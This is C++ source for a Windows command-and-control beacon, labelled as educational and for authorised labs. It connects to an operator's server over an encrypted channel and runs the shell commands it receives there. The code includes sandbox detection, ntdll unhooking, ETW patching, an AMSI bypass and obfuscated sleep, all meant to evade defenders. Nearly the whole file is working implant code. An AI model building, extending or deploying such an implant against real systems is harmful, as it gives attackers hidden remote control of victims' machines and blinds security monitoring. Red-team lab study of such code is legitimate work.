// Simple educational C2 model - CLIENT (beacon) with full evasion stack
// Usage: client <server-ip> <port>
// For authorized labs / CTF only.
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include "syscalls.h"
#include "crypto.h"
#include "http.h"
#include "evasion.h"
#include "obf.h"
#pragma comment(lib, "ws2_32.lib")

static std::string run_cmd(const std::string& cmd) {
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "[error] popen failed";
    std::string out;
    char buf[256];
    while (fgets(buf, sizeof(buf), pipe)) out += buf;
    _pclose(pipe);
    return out;
}

static std::string to_lower(const std::string& s) {
    std::string o = s;
    for (auto& c : o) c = (char)tolower(c);
    return o;
}

// in-process command dispatch: no cmd.exe spawned for built-ins
static std::string exec_native(const std::string& cmd, bool& handled) {
    handled = false;
    std::string out;
    std::string tok = cmd, arg;
    size_t sp = cmd.find_first_of(" \t");
    if (sp != std::string::npos) {
        tok = cmd.substr(0, sp);
        size_t a0 = cmd.find_first_not_of(" \t", sp);
        arg = (a0 == std::string::npos) ? "" : cmd.substr(a0);
    }
    std::string low = to_lower(tok);

    if (low == "whoami") {
        handled = true;
        char user[256] = {0}, host[256] = {0};
        DWORD un = sizeof(user), hn = sizeof(host);
        if (GetUserNameA(user, &un) && GetComputerNameA(host, &hn)) {
            out = std::string(host) + "\\" + user;
        } else {
            out = "[error] GetUserName failed";
        }
    } else if (low == "cd") {
        handled = true;
        if (!arg.empty() && !SetCurrentDirectoryA(arg.c_str()))
            out = "[error] cd failed: " + arg;
        char cwd[MAX_PATH];
        if (GetCurrentDirectoryA(MAX_PATH, cwd))
            out += std::string(cwd) + "\n";
    } else if (low == "dir") {
        handled = true;
        std::string pattern = arg.empty() ? "*" : arg;
        if (pattern.find_first_of("*?") == std::string::npos) pattern += "\\*";
        WIN32_FIND_DATAA fd{};
        HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) {
            out = "[error] dir failed\n";
        } else {
            do {
                out += std::string(fd.cFileName) + (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ? "\\" : "") +
                       "  " + std::to_string(fd.nFileSizeLow) + "\n";
            } while (FindNextFileA(h, &fd));
            FindClose(h);
        }
    } else if (low == "ps") {
        handled = true;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            out = "[error] snapshot failed\n";
        } else {
            PROCESSENTRY32 pe{};
            pe.dwSize = sizeof(pe);
            if (Process32First(snap, &pe)) {
                do {
                    out += std::to_string(pe.th32ProcessID) + "  " + pe.szExeFile + "\n";
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    } else if (low == "sysinfo") {
        handled = true;
        SYSTEM_INFO si{};
        GetSystemInfo(&si);
        MEMORYSTATUSEX ms{};
        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        out = "cpus: " + std::to_string(si.dwNumberOfProcessors) +
              "\nram: " + std::to_string(ms.ullTotalPhys / (1024 * 1024)) + " MB" +
              "\npagefile: " + std::to_string(ms.ullTotalPageFile / (1024 * 1024)) + " MB\n";
    }
    return out;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "usage: client <server-ip> <port>\n";
        return 1;
    }

    srand((unsigned)GetTickCount());

    if (ev::is_sandbox()) {
        std::cerr << "[beacon] sandbox environment detected, exiting\n";
        return 1;
    }

    if (!sc::init()) {
        std::cerr << "[beacon] failed to init indirect syscalls\n";
        return 1;
    }

    ev::unhook_ntdll();
    ev::patch_etw();
    ev::bypass_amsi();

    std::string key = XS("s3cr3t-lab-key-2026").get();
    if (!crypto_init(key.c_str())) {
        std::cerr << "[beacon] crypto init failed\n";
        return 1;
    }

    SIZE_T buf_size = 0x10000;
    PVOID stage = nullptr;
    LONG st = sc::NtAllocateVirtualMemory(GetCurrentProcess(), &stage, 0, &buf_size,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0 || !stage) {
        std::cerr << "[beacon] NtAllocateVirtualMemory failed: 0x" << std::hex << st << "\n";
        return 1;
    }

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN addr{};
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, argv[1], &addr.sin_addr);
    addr.sin_port = htons((u_short)atoi(argv[2]));

    if (connect(s, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        std::cerr << "[beacon] connect failed: " << WSAGetLastError() << "\n";
        return 1;
    }

    SecureChannel tls;
    if (!tls.client_handshake(s)) {
        std::cerr << "[beacon] secure handshake failed\n";
        return 1;
    }
    std::cout << "[beacon] connected to " << argv[1] << ":" << argv[2] << " (ECDH-P256 + AES-GCM)\n";

    while (true) {
        std::string req;
        if (!http_read_body(tls, req)) break;

        std::string cmd;
        if (!crypto_decrypt(req, cmd)) {
            std::cout << "[beacon] decrypt failed\n";
            continue;
        }
        memcpy(stage, cmd.data(), cmd.size());
        ((char*)stage)[cmd.size()] = 0;

        if (cmd == "exit" || cmd == "quit") {
            http_send_response(tls, "");
            break;
        }

        bool handled = false;
        std::string out = exec_native(cmd, handled);
        if (!handled) out = run_cmd((char*)stage);

        std::string enc;
        if (!crypto_encrypt(out, enc)) break;
        if (!http_send_response(tls, enc)) break;

        // jitter + Ekko-style sleep: working data is ciphertext at rest
        std::string().swap(out);
        std::string().swap(enc);
        std::string().swap(cmd);
        DWORD ms = 500 + (DWORD)(rand() % 4500);
        ev::obfuscate_sleep(ms, stage, 0x1000);
    }

    tls.close();
    WSACleanup();
    return 0;
}
